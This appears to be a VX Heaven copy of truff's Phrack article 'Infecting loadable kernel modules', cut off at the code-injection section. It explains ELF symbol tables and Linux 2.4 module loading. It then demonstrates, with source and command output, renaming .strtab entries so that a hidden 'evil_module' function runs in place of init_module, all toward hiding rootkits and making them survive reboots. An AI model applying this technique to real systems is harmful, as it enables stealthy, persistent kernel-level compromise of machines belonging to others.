<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> truff 'Infecting loadable kernel modules' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="truff"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, truff,Infecting loadable kernel modules, module, init, char, evil, struct, original, text, dumm, test, offset, exit, include, evclean, info, symbol"/>
<meta name="Description" content="Since a few years we have seen a lot of rootkits using loadable kernel modules. Is this a fashion ? not really, lkm's are widely used because they are powerfull: you can hide files, processes and do other nice things. The first rootkits using lkm's could be easily detected because they where listed when issuing a lsmod. We have seen lots of techniques to hide modules, like the one used in Plaguez's paper [1] or the more tricky used in the Adore Rootkit [2]. A few years later we have seen other techniques based on the modification of the kernel memory image using /dev/kmem [3]. Finally, a technique of static kernel patching was presented to us in [4]. This one solves an important problem: the rootkit will be reloaded after a reboot.The goal of this paper is to describe a new technique used to hide lkm's and to ensure us that they will be reloaded after a reboot. We are going to see how to do this by infecting a kernel module used by the system. We will focus on Linux kernel x86 2.4.x series but this technique can be applied to other operating systems that use the ELF format.  Some knowledge is necessary to understand this technique. Kernel modules are ELF object files, we will thus study the ELF format focusing on some particular parts related to the symbol naming in an ELF object file. After that, we will study the mechanisms wich are used to load a module to give us some knowledge on the technique which will permit to inject code into a kernel module. Finally, we will see how we can inject a module into another one in real life."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"a98a2e7a96779c7b1935f49ca3eaf39c22bb6c21-1498756493-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vtr00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Infecting loadable kernel modules</h1><p><a href="/lib/?lang=en&amp;author=truff"> truff</a><br/> <em><a href="/vx.php?fid=1898#f1898">PHrack [61]</a></em><br/> <em>August 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vtr00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=RK#vtr00">Back to index</a>] [<a href="/lib/vtr00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">1 - Introduction</a></li>
<li><a href="#c2">2 - ELF Basis</a>
<ul>
<li><a href="#c21">2.1 - The .symtab section</a></li>
<li><a href="#c22">2.2 - The .strtab section</a></li>
</ul></li>
<li><a href="#c3">3 - Playing with loadable kernel modules</a>
<ul>
<li><a href="#c31">3.1 - Module Loading</a></li>
<li><a href="#c32">3.2 - .strtab modification</a></li>
<li><a href="#c33">3.3 - Code injection</a></li>
<li><a href="#c34">3.4 - Keeping stealth</a></li>
</ul></li>
<li><a href="#c4">4 - Real life example</a>
<ul>
<li><a href="#c41">4.1 - Lkm infecting mini-howto</a></li>
<li><a href="#c42">4.2 - I will survive (a reboot)</a></li>
</ul></li>
<li><a href="#c5">5 - What about other systems?</a>
<ul>
<li><a href="#c51">5.1 - Solaris</a></li>
<li><a href="#c52">5.2 - *BSD</a>
<ul>
<li><a href="#c521">5.2.1 - FreeBSD</a></li>
<li><a href="#c522">5.2.2 - NetBSD</a></li>
<li><a href="#c523">5.2.3 - OpenBSD</a></li>
</ul></li>
</ul></li>
<li><a href="#c6">6 - Conclusion</a></li>
<li><a href="#c7">7 - Greetings</a></li>
<li><a href="#c8">8 - References</a></li>
<li><a href="#c9">9 - Codes</a>
<ul>
<li><a href="#c91">9.1 - ElfStrChange</a></li>
<li><a href="#c92">9.2 Lkminject</a></li>
</ul></li>
</ul>
<h2><a name="c1"></a>1 - Introduction</h2>
<p>Since a few years we have seen a lot of rootkits using loadable kernel modules. Is this a fashion ? not really, lkm's are widely used because they are powerfull: you can hide files, processes and do other nice things. The first rootkits using lkm's could be easily detected because they where listed when issuing a lsmod. We have seen lots of techniques to hide modules, like the one used in Plaguez's paper [1] or the more tricky used in the Adore Rootkit [2]. A few years later we have seen other techniques based on the modification of the kernel memory image using /dev/kmem [3]. Finally, a technique of static kernel patching was presented to us in [4]. This one solves an important problem: the rootkit will be reloaded after a reboot.</p>
<p>The goal of this paper is to describe a new technique used to hide lkm's and to ensure us that they will be reloaded after a reboot. We are going to see how to do this by infecting a kernel module used by the system. We will focus on Linux kernel x86 2.4.x series but this technique can be applied to other operating systems that use the ELF format. Some knowledge is necessary to understand this technique. Kernel modules are ELF object files, we will thus study the ELF format focusing on some particular parts related to the symbol naming in an ELF object file. After that, we will study the mechanisms wich are used to load a module to give us some knowledge on the technique which will permit to inject code into a kernel module. Finally, we will see how we can inject a module into another one in real life.</p>
<h2><a name="c2"></a>2 - ELF Basis</h2>
<p>The Executable and Linking Format (ELF) is the executable file format used on the Linux operating system. We are going to have a look at the part of this format which interests us and which will be useful later (Read [1] to have a full description of the ELF format). When linking two ELF objects the linker needs to know some data refering to the symbols contained in each object. Each ELF object (lkm's for example) contains two sections whose role is to store structures of information describing each symbol. We are going to study them and to extract some usefull ideas for the infection of a kernel module.</p>
<h3><a name="c21"></a>2.1 - The .symtab section</h3>
<p>This section is a tab of structures that contains data requiered by the linker to use symbols contained in a ELF object file. This structure is defined in the file /usr/include/elf.h:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Symbol table entry. &nbsp;*/</span><br/>
<br/>
<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; Elf32_Word&nbsp; &nbsp; st_name<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Symbol name (string tbl index) */</span><br/>
&nbsp; Elf32_Addr&nbsp; &nbsp; st_value<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Symbol value */</span><br/>
&nbsp; Elf32_Word&nbsp; &nbsp; st_size<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Symbol size */</span><br/>
&nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> st_info<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Symbol type and binding */</span><br/>
&nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> st_other<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Symbol visibility */</span><br/>
&nbsp; Elf32_Section st_shndx<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Section index */</span><br/>
<span style="color: black;">&#125;</span> Elf32_Sym<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>The only field which will interest us later is st_name. This field is an index of the .strtab section where the name of the symbol is stored.</p>
<h3><a name="c22"></a>2.2 - The .strtab section</h3>
<p>The .strtab section is a tab of null terminated strings. As we saw above, the st_name field of the Elf32_Sym structure is an index in the .strtab section, we can thus easily obtain the offset of the string which contains the name of the symbol by the following formula:</p>
<pre>offset_sym_name = offset_strtab + st_name</pre>
<p>offset_strtab is the offset of the .strtab section from the beginning of the file. It is obtained by the section name resolution mechanism which I will not describe here because it does not bring any interest to the covered subject. This mechanism is fully described in [5] and implemented in the code (paragraph 9.1).</p>
<p>We can then deduce that the name of a symbol in a ELF object can be easily accessed and thus easily modified. However a rule must be complied with to carry out a modification. We saw that the .strtab section is a succession of null terminated strings, this implies a restriction on the new name of a symbol after a modification: the length of the new name of the symbol will have to be lower or equal to that of the original name overwise it will overflow the name of the next symbol in the .strtab section.</p>
<p>We will see thereafter that the simple modification of a symbol's name will lead us to the modification of the normal operation of a kernel module and finally to the infection of a module by another one.</p>
<h2><a name="c3"></a>3 - Playing with loadable kernel modules</h2>
<p>The purpose of the next section is to show the code which dynamically loads a module. With this concepts in mind, we will be able to foresee the technique which will lead us to inject code into the module.</p>
<h3><a name="c31"></a>3.1 - Module Loading</h3>
<p>Kernel modules are loaded with the userland utility insmod which is part of the modutils[6] package. The interesting stuff is located in the init_module() functions of the insmod.c file.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<br/>
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span> init_module<span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>m_name<span style="color: #339933;">,</span> <span style="color: #993333;">struct</span> obj_file <span style="color: #339933;">*</span>f<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> m_size<span style="color: #339933;">,</span> <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>blob_name<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> noload<span style="color: #339933;">,</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> flag_load_map<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; <span style="color: #993333;">struct</span> module <span style="color: #339933;">*</span>module<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> obj_section <span style="color: #339933;">*</span>sec<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>image<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> ret <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; tgt_long m_addr<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ....<br/>
<br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; module<span style="color: #339933;">-&gt;</span>init <span style="color: #339933;">=</span> obj_symbol_final_value<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; obj_find_symbol<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;init_module&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; module<span style="color: #339933;">-&gt;</span>cleanup <span style="color: #339933;">=</span> obj_symbol_final_value<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; obj_find_symbol<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;cleanup_module&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ....<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ret <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: #339933;">!</span>noload<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fflush.html"><span style="color: #000066;">fflush</span></a><span style="color: black;">&#40;</span>stdout<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Flush any debugging output */</span><br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret <span style="color: #339933;">=</span> sys_init_module<span style="color: black;">&#40;</span>m_name<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> module <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> image<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ret<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; error<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;init_module: %m&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lprintf<span style="color: black;">&#40;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;Hint: insmod errors can be caused by incorrect module parameters, &quot;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;including invalid IO or IRQ parameters.<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;You may find more information in syslog or the output from dmesg&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>This function is used (1) to fill a struct module which contains the necessary data to load the module. The interestings fields are init_module and cleanup_module which are functions pointers pointing respectively to the init_module() and cleanup_module() of the module being loaded. The obj_find_symbol() function (2) extracts a struct symbol by traversing the symbol table and looking for the one whose name is init_module. This struct is passed to the obj_symbol_final_value() which extracts the address of the init_module function from the struct symbol. The same operation is then carried out (3) for the function cleanup_module(). It is necessary to keep in mind that the functions which will be called when initializing and terminating the module are those whose entry in the .strtab section corresponds respectively to init_module and cleanup_module.</p>
<p>When the struct module is completely filled in (4) the sys_init_module() syscall is called to let the kernel load the module.</p>
<p>Here is the interesting part of the sys_init_module() syscall wich is called during module loading. This function's code is located in the /usr/src/linux/kernel/module.c file:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">asmlinkage <span style="color: #993333;">long</span><br/>
sys_init_module<span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name_user<span style="color: #339933;">,</span> <span style="color: #993333;">struct</span> module <span style="color: #339933;">*</span>mod_user<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> module mod_tmp<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>mod<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>n_name<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>name_tmp <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> namelen<span style="color: #339933;">,</span> n_namelen<span style="color: #339933;">,</span> i<span style="color: #339933;">,</span> error<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> mod_user_size<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> module_ref <span style="color: #339933;">*</span>dep<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Lots of sanity checks */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; .....<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Ok, that's about all the sanity we can stomach; copy the rest.*/</span><br/>
<br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>copy_from_user<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span>mod<span style="color: #339933;">+</span>mod_user_size<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span>mod_user<span style="color: #339933;">+</span>mod_user_size<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mod<span style="color: #339933;">-&gt;</span>size<span style="color: #339933;">-</span>mod_user_size<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; error <span style="color: #339933;">=</span> <span style="color: #339933;">-</span>EFAULT<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> err3<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Other sanity checks */</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ....<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Initialize the module. &nbsp;*/</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; atomic_set<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>mod<span style="color: #339933;">-&gt;</span>uc.<span style="color: #202020;">usecount</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; mod<span style="color: #339933;">-&gt;</span>flags <span style="color: #339933;">|=</span> MOD_INITIALIZING<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>mod<span style="color: #339933;">-&gt;</span>init <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span>error <span style="color: #339933;">=</span> mod<span style="color: #339933;">-&gt;</span>init<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; atomic_set<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>mod<span style="color: #339933;">-&gt;</span>uc.<span style="color: #202020;">usecount</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mod<span style="color: #339933;">-&gt;</span>flags <span style="color: #339933;">&amp;=</span> ~MOD_INITIALIZING<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>error <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #808080; font-style: italic;">/* Buggy module */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; error <span style="color: #339933;">=</span> <span style="color: #339933;">-</span>EBUSY<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> err0<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; atomic_dec<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>mod<span style="color: #339933;">-&gt;</span>uc.<span style="color: #202020;">usecount</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>After a few sanity checks, the struct module is copied from userland to kernelland by calling (1) copy_from_user(). Then (2) the init_module() function of the module being loaded is called using the mod->init() funtion pointer wich has been filled by the insmod utility.</p>
<h3><a name="c32"></a>3.2 - .strtab modification</h3>
<p>We have seen that the address of the module's init function is located using a string in the .strtab section. The modification of this string will allow us to execute another function than init_module() when the module is loaded.</p>
<p>There are a few ways to modify an entry of the .strtab section. The -wrap option of ld can be used to do it but this option isn't compatible with the -r option that we will need later (paragraph 3.3). We will see in paragraph 5.1 how to use xxd to do the work. I have coded a tool (paragraph 9.1) to automate this task.</p>
<p>Here's a short example:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat test.c</span><br/>
<span style="color: #339933;">#define MODULE</span><br/>
<span style="color: #339933;">#define __KERNEL__</span><br/>
<br/>
<span style="color: #339933;">#include &lt;linux/module.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;linux/kernel.h&gt;</span><br/>
<br/>
<span style="color: #993333;">int</span> init_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Into init_module()<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> evil_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Into evil_module()<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> cleanup_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Into cleanup_module()<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre>$ cc -O2 -c test.c</pre>
<p>Let's have a look at the .symtab and .strtab sections:</p>
<pre>
$ objdump -t test.o 

test.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 test.c
0000000000000000 l    d  .text  0000000000000000 
0000000000000000 l    d  .data  0000000000000000 
0000000000000000 l    d  .bss   0000000000000000 
0000000000000000 l    d  .modinfo  0000000000000000 
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    d  .rodata   0000000000000000 
0000000000000000 l    d  .comment  0000000000000000 
0000000000000000 g     F .text  0000000000000014 init_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000014 g     F .text  0000000000000014 evil_module
0000000000000028 g     F .text  0000000000000014 cleanup_module
</pre>
<p>We are now going to modify 2 entries of the .strtab section to make the evil_module symbol's name become init_module. First we must rename the init_module symbol because 2 symbols of the same nature can't have the same name in the same ELF object. The following operations are carried out:</p>
<pre>  
		rename
1)  init_module  ---->  dumm_module
2)  evil_module  ---->  init_module


$ ./elfstrchange test.o init_module dumm_module
[+] Symbol init_module located at 0x3dc
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange test.o evil_module init_module
[+] Symbol evil_module located at 0x3ef
[+] .strtab entry overwriten with init_module

$ objdump -t test.o 

test.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 test.c
0000000000000000 l    d  .text  0000000000000000 
0000000000000000 l    d  .data  0000000000000000 
0000000000000000 l    d  .bss   0000000000000000 
0000000000000000 l    d  .modinfo  0000000000000000 
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    d  .rodata   0000000000000000 
0000000000000000 l    d  .comment  0000000000000000 
0000000000000000 g     F .text  0000000000000014 dumm_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000014 g     F .text  0000000000000014 init_module
0000000000000028 g     F .text  0000000000000014 cleanup_module


# insmod test.o 
# tail -n 1 /var/log/kernel 
May  4 22:46:55 accelerator kernel:  Into evil_module()
</pre>
<p>As we can see, the evil_module() function has been called instead of init_module().</p>
<h3><a name="c33"></a>3.3 - Code injection</h3>
